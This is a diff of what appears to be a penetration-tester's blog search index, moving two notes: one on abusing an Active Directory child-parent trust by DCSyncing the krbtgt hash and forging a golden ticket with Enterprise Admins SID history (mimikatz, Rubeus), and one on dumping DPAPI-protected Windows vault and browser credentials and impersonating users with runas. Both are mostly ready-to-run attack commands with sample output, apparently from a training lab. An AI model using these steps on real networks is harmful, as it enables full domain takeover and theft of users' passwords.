@@ -203,6 +203,69 @@
       </tags>
   </entry>
   <entry>
+    <title>Attacking Child-Parent Trust From Windows</title>
+    <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
+    <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
+<p>To successfully get access to the parent domain we need first : </p>
+<ul>
+<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
+<li>The SID of the child domain.</li>
+<li>The FQDN of the child domain.</li>
+<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
+<li>The SID of the Enterprise Admins Group of the parent domain.</li>
+</ul>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h3 id="Enumerate-Trust-Relationship"><a href="#Enumerate-Trust-Relationship" class="headerlink" title="Enumerate Trust Relationship"></a>Enumerate Trust Relationship</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>
+
+
+<p>➜ We have a <code>bidirectional Trust</code> between <code>Parent</code> and <code>Child</code> Domains.</p>
+<p>➜ We don’t have any SID Filter applied.</p>
+<h3 id="Enumerate-Account-Privs"><a href="#Enumerate-Account-Privs" class="headerlink" title="Enumerate Account Privs"></a>Enumerate Account Privs</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net user our<span class="literal">-privileged-user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Domain Users         *Domain Admins</span><br></pre></td></tr></table></figure>
+
+
+<p>We are <em>Domain Admins</em> so we can DCSync and try ExtraSids Attack ( SID History Abuse)</p>
+<h1 id="Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain"><a href="#Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain" class="headerlink" title="Extract Sid, FQDN And krbtgt Hash Of The Child Domain"></a>Extract Sid, FQDN And krbtgt Hash Of The Child Domain</h1><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:NETBIOS_DOMAIN/krbtgt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line"></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br></pre></td></tr></table></figure>
+
+
+<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
+<p>SID : <code>S-1-5-21-2806153819-209893948-922872689</code>.</p>
+<p>krbtgt Hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
+<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>Get <code>child Domain</code> SID</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>
+
+<p>Get <code>Enterprise Admins</code> SID</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> parent<span class="literal">-domain</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid</span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span></span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h1><blockquote>
+<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
+</blockquote>
+<h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::golden /user:twistzz /domain:child-domain-FQDN /sid:child-domain-SID /krbtgt:KRBTGT-hash /sids:Enterprise-Admins-SID /ptt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe golden /rc4:KRBTGT<span class="literal">-hash</span> /domain:child<span class="literal">-domain-FQDN</span> /sid:child<span class="literal">-domain-SID</span>  /sids:Enterprise<span class="literal">-Admins-SID</span> /user:twistzz /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJ   &lt;SNIP&gt;   JFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Access-Files"><a href="#Access-Files" class="headerlink" title="Access Files"></a>Access Files</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; <span class="built_in">type</span> \\dc<span class="literal">-name</span>.parent<span class="literal">-domain</span>\c<span class="variable">$</span>\ExtraSids\script.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="DCSync-Parent-Domain"><a href="#DCSync-Parent-Domain" class="headerlink" title="DCSync Parent Domain"></a>DCSync Parent Domain</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; netdom query /domain:parent<span class="literal">-domain</span> dc</span><br><span class="line">List of domain controllers with accounts <span class="keyword">in</span> the domain:</span><br><span class="line"></span><br><span class="line">dc<span class="literal">-name-of-parent-domain</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /dc:dc-name-of-parent-domain /domain:parent-domain /all /csv</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Abuse Child-Parent Trust From Windows</category>
+      </categories>
+      <tags>
+        <tag>PowerView</tag>
+        <tag>Mimikatz</tag>
+        <tag>Rubeus</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Attacking Child-Parent Trust From Linux</title>
     <url>/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</url>
     <content><![CDATA[<blockquote>
@@ -265,61 +328,56 @@
       </tags>
   </entry>
   <entry>
-    <title>Attacking Child-Parent Trust From Windows</title>
-    <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
-    <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
-<p>To successfully get access to the parent domain we need first : </p>
+    <title>DPAPI</title>
+    <url>/2025/11/26/DPAPI/</url>
+    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
 <ul>
-<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
-<li>The SID of the child domain.</li>
-<li>The FQDN of the child domain.</li>
-<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
-<li>The SID of the Enterprise Admins Group of the parent domain.</li>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
+<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
+<li><code>%ProgramData%\Microsoft\Vault\</code></li>
+<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
 </ul>
-</blockquote>
-<h1 id="Enumerate-Trust-Relationship"><a href="#Enumerate-Trust-Relationship" class="headerlink" title="Enumerate Trust Relationship"></a>Enumerate Trust Relationship</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>
+<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
+<li>Website passwords.</li>
+<li>Online account logins</li>
+</ul>
+<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
+<li>Network shares (like <code>\\server\share</code>)</li>
+<li>Domain user logins</li>
+<li>Services (OneDrive, etc.)</li>
+<li>Remote desktop connections</li>
+</ul>
+<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
+<p>For standard vaults </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
+
+<p>For stored credentials</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
 
 
-<p>➜ We have a <code>bidirectional Trust</code> between <code>Parent</code> and <code>Child</code> Domains.</p>
-<p>➜ We don’t have any SID Filter applied.</p>
-<h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><h3 id="Enumerate-Account-Privs"><a href="#Enumerate-Account-Privs" class="headerlink" title="Enumerate Account Privs"></a>Enumerate Account Privs</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net user our<span class="literal">-privileged-user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Domain Users         *Domain Admins</span><br></pre></td></tr></table></figure>
+<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
+<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
 
 
-<p>We are <em>Domain Admins</em> so we can DCSync and try ExtraSids Attack ( SID History Abuse)</p>
-<h3 id="Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain"><a href="#Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain" class="headerlink" title="Extract Sid, FQDN And krbtgt Hash Of The Child Domain"></a>Extract Sid, FQDN And krbtgt Hash Of The Child Domain</h3><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:NETBIOS_DOMAIN/krbtgt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line"></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br></pre></td></tr></table></figure>
+<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
 
+<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
+<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
+<p>➜ This will create a new <code>powershell</code> process.</p>
+<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
-<p>SID : <code>S-1-5-21-2806153819-209893948-922872689</code>.</p>
-<p>krbtgt Hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
-<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>Get <code>child Domain</code> SID</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>
-
-<p>Get <code>Enterprise Admins</code> SID</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> parent<span class="literal">-domain</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid</span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span></span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h3><blockquote>
-<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::golden /user:twistzz /domain:child-domain-FQDN /sid:child-domain-SID /krbtgt:KRBTGT-hash /sids:Enterprise-Admins-SID /ptt</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Access-Files"><a href="#Access-Files" class="headerlink" title="Access Files"></a>Access Files</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; <span class="built_in">type</span> \\dc<span class="literal">-name</span>.parent<span class="literal">-domain</span>\c<span class="variable">$</span>\ExtraSids\script.txt</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="DCSync-Parent-Domain"><a href="#DCSync-Parent-Domain" class="headerlink" title="DCSync Parent Domain"></a>DCSync Parent Domain</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; netdom query /domain:parent<span class="literal">-domain</span> dc</span><br><span class="line">List of domain controllers with accounts <span class="keyword">in</span> the domain:</span><br><span class="line"></span><br><span class="line">dc<span class="literal">-name-of-parent-domain</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /dc:dc-name-of-parent-domain /domain:parent-domain /all /csv</span></span><br></pre></td></tr></table></figure>]]></content>
+]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Abuse Child-Parent Trust From Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
       </categories>
       <tags>
-        <tag>PowerView</tag>
-        <tag>Mimikatz</tag>
+        <tag>Dump-DPAPI</tag>
       </tags>
   </entry>
   <entry>
@@ -420,59 +478,6 @@
       </categories>
       <tags>
         <tag>Dump-NTDS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DPAPI</title>
-    <url>/2025/11/26/DPAPI/</url>
-    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
-<ul>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
-<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
-<li><code>%ProgramData%\Microsoft\Vault\</code></li>
-<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
-</ul>
-<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
-<li>Website passwords.</li>
-<li>Online account logins</li>
-</ul>
-<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
-<li>Network shares (like <code>\\server\share</code>)</li>
-<li>Domain user logins</li>
-<li>Services (OneDrive, etc.)</li>
-<li>Remote desktop connections</li>
-</ul>
-<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
-<p>For standard vaults </p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
-
-<p>For stored credentials</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
-
-
-<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
-<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
-<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
-<p>➜ This will create a new <code>powershell</code> process.</p>
-<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-DPAPI</tag>
       </tags>
   </entry>
